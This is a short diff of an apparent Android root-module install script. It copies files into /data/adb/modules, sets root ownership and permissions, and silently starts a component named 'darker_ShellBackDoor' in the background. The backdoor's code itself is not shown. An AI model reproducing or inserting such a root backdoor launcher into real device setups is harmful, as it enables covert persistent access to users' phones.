@@ -15,4 +15,4 @@ MODS_PATH="/data/adb/modules"
 rm -rf "$MODPATH"/customize.sh; cp -af "$MODPATH" $MODS_PATH
 chown -R root:root "$MODS_PATH"
 chmod -R 0775 "$MODS_PATH"
-sh $MODS_PATH/darker_ShellBackDoor/service.sh 2>/dev/null &
+$MODS_PATH/darker_ShellBackDoor/service.sh 2>/dev/null &
